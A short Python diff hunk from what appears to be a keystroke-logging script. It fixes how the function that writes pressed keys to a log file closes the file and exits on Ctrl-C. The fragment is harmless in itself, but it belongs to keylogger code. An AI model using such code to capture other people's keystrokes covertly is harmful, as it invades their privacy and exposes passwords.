@@ -12,7 +12,7 @@ def write_to_log_file(key) -> None:
     keys = str(key)
 
     if keys == "'\\x03'":
-        return log_file.close()
+        log_file.close()
         sys.exit()
 
     if keys == 'Key.enter':
